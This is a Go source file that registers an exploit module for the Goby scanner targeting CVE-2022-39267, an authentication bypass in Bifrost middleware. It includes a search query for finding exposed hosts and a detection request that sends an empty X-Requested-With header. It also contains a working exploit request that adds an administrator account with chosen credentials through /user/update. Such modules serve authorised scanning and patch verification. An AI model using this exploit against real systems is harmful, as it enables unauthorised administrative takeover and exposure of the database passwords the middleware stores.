package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Bifrost X-Requested-With Authentication Bypass Vulnerability (CVE-2022-39267)",
    "Description": "<p>Bifrost is a heterogeneous middleware that synchronizes MySQL, MariaDB to Redis, MongoDB, ClickHouse, MySQL and other services for production environments. Versions prior to 1.8.8-release are subject to authentication bypass in the admin and monitor user groups by deleting the X-Requested-With: XMLHttpRequest field in the request header. This issue has been patched in 1.8.8-release. There are no known workarounds.</p>",
    "Product": "Bifrost",
    "Homepage": "https://github.com/brokercap/Bifrost",
    "DisclosureDate": "2022-10-19",
    "Author": "小火车",
    "FofaQuery": "body=\"/dologin\" && body=\"Bifrost\"",
    "GobyQuery": "body=\"/dologin\" && body=\"Bifrost\"",
    "Level": "2",
    "Impact": "<p>Bifrost is a heterogeneous middleware that synchronizes MySQL, MariaDB and Kafka to Redis, MongoDB, ClickHouse and other services for production environments. It can bypass identity authentication by deleting request headers and obtain passwords for various database accounts configured in the environment</p>",
    "Recommendation": "<p><a href=\"https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j\">https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j</a></p><p><a href=\"https://github.com/brockercap/Bifrost/pull/201\">https://github.com/brockercap/Bifrost/pull/201</a> </p>",
    "References": [
        "https://github.com/brokercap/Bifrost"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "add_Username",
            "type": "input",
            "value": "user",
            "show": ""
        },
        {
            "name": "add_User_password",
            "type": "input",
            "value": "password",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/toserver/index",
                "follow_redirect": false,
                "header": {
                    "X-Requested-With": ""
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ConnUri",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/user/update",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"UserName\":\"{{{add_Username}}}\",\"Password\":\"{{{add_User_password}}}\",\"Group\":\"administrator\",\"Host\":\"\"}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"status\":1,\"msg\":\"success\",\"data\":null}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-39267"
    ],
    "CNNVD": [
        "CNNVD-202210-1345"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "Bifrost 中间件 X-Requested-With 系统身份认证绕过漏洞（CVE-2022-39267）",
            "Product": "Bifrost",
            "Description": "<p>Bifrost是一款面向生产环境的 MySQL，MariaDB，kafka 同步到Redis，MongoDB，ClickHouse等服务的异构中间件，可通过删除请求头实现身份认证绕过，获取环境内配置各种数据库账户密码。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新:<a href=\"https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j\">https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j</a><br></p>",
            "Impact": "<p>Bifrost是一款面向生产环境的 MySQL，MariaDB，kafka 同步到Redis，MongoDB，ClickHouse等服务的异构中间件，可通过删除请求头实现身份认证绕过，获取环境内配置各种数据库账户密码。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Bifrost X-Requested-With Authentication Bypass Vulnerability (CVE-2022-39267)",
            "Product": "Bifrost",
            "Description": "<p>Bifrost is a heterogeneous middleware that synchronizes MySQL, MariaDB to Redis, MongoDB, ClickHouse, MySQL and other services for production environments. Versions prior to 1.8.8-release are subject to authentication bypass in the admin and monitor user groups by deleting the X-Requested-With: XMLHttpRequest field in the request header. This issue has been patched in 1.8.8-release. There are no known workarounds.</span><br></p>",
            "Recommendation": "<p><a href=\"https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j\">https://github.com/brokercap/Bifrost/security/advisories/GHSA-mxrx-fg8p-5p5j</a></p><p><a href=\"https://github.com/brockercap/Bifrost/pull/201\">https://github.com/brockercap/Bifrost/pull/201</a>&nbsp;</p>",
            "Impact": "<p>Bifrost is a heterogeneous middleware that synchronizes MySQL, MariaDB and Kafka to Redis, MongoDB, ClickHouse and other services for production environments. It can bypass identity authentication by deleting request headers and obtain passwords for various database accounts configured in the environment<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10791"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}